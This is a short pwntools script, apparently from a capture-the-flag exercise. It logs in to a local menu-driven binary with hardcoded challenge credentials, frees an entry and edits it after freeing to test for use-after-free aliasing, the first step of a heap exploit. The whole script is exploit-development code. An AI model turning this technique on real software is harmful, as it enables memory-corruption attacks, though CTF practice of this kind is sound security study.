from pwn import *
context.log_level='info'
p=process('./pwn', cwd='.')
def menu(n):
    p.sendlineafter(b'> ', str(n).encode())
def save(idx,size,data):
    menu(1); p.sendlineafter(b'Input the key: ',str(idx).encode()); p.sendlineafter(b'Input the value size: ',str(size).encode()); p.sendafter(b'Input the value: ',data)
def readv(idx):
    menu(2); p.sendlineafter(b'Input the key: ',str(idx).encode()); return p.recvuntil(b'Success!', timeout=1)
def delete(idx):
    menu(3); p.sendlineafter(b'Input the key: ',str(idx).encode())
def edit(idx,data):
    menu(4); p.sendlineafter(b'Input the key: ',str(idx).encode()); p.sendafter(b'Input the value: ',data)
p.sendlineafter(b'Input your username:', b'admin')
p.sendlineafter(b'Input your password:', b's4cur1ty_p4ssw0rd')
save(0,8,b'ABCDEFGH')
print('READ-before', readv(0))
delete(0)
save(1,8,b'IJKLMNOP')
edit(0,b'WXYZ1234')
print('READ-alias-1', readv(1))
print('READ-after', readv(0))
menu(5)
p.close()
